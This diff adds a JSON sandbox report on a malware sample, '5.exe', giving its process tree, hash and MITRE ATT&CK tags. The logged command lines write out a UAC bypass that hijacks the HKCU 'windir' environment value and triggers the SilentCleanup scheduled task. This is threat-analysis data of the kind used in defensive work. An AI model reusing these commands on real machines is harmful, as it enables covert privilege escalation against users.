@@ -1,0 +1,168 @@
+{
+ "Name": "5.exe",
+ "Md5": "b163f86e0a052dc10597cbeae51de878",
+ "UUID": "7aee6501-3c20-4512-8702-36b9a3471d60",
+ "Processes": [
+  {
+   "OID": "5eae19b52c3350084cbf75ba",
+   "ProcessID": 3252,
+   "ParentPID": 372,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\5.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\5.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1588468148930
+  },
+  {
+   "OID": "5eae19d62c3350084cbfb21d",
+   "ProcessID": 1756,
+   "ParentPID": 3252,
+   "CommandLine": "cmd /c \"\"C:\\Users\\Public\\Natso.bat\" \"",
+   "Image": "C:\\Windows\\system32\\cmd.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1588468182029
+  },
+  {
+   "OID": "5eae19d62c3350084cbfb21f",
+   "ProcessID": 3436,
+   "ParentPID": 1756,
+   "CommandLine": "reg  delete hkcu\\Environment /v windir /f ",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1588468182089
+  },
+  {
+   "OID": "5eae19d62c3350084cbfb220",
+   "ProcessID": 3224,
+   "ParentPID": 1756,
+   "CommandLine": "reg  add hkcu\\Environment /v windir /d \"cmd /c start /min  C:\\Users\\Public\\x.bat reg  delete hkcu\\Environment /v windir /f \u0026\u0026 REM \"",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1588468182125
+  },
+  {
+   "OID": "5eae19d62c3350084cbfb221",
+   "ProcessID": 2004,
+   "ParentPID": 1756,
+   "CommandLine": "schtasks  /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I",
+   "Image": "C:\\Windows\\system32\\schtasks.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1588468182158
+  },
+  {
+   "OID": "5eae19d62c3350084cbfb222",
+   "ProcessID": 1084,
+   "ParentPID": 1756,
+   "CommandLine": "reg  delete hkcu\\Environment /v windir /f ",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1588468182213
+  },
+  {
+   "OID": "5eae19e02c3350084cbfb9c3",
+   "ProcessID": 3868,
+   "ParentPID": 3252,
+   "CommandLine": "\"C:\\Program Files\\internet explorer\\ieinstal.exe\"",
+   "Image": "C:\\Program Files\\internet explorer\\ieinstal.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1588468192269
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5eae19e02c3350084cbfb9c3",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1056"
+   ]
+  },
+  {
+   "ProcessOID": "5eae19e02c3350084cbfb9c3",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5eae19e02c3350084cbfb9c3",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5eae19e02c3350084cbfb9c3",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5eae19d62c3350084cbfb221",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5eae19d62c3350084cbfb21d",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5eae19d62c3350084cbfb21d",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1112",
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5eae19b52c3350084cbf75ba",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1059"
+   ]
+  },
+  {
+   "ProcessOID": "5eae19b52c3350084cbf75ba",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5eae19b52c3350084cbf75ba",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1060"
+   ]
+  },
+  {
+   "ProcessOID": "5eae19b52c3350084cbf75ba",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5eae19b52c3350084cbf75ba",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1130"
+   ]
+  },
+  {
+   "ProcessOID": "5eae19b52c3350084cbf75ba",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1130"
+   ]
+  },
+  {
+   "ProcessOID": "5eae19b52c3350084cbf6df3",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5eae19b52c3350084cbf75ba",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  }
+ ]
+}
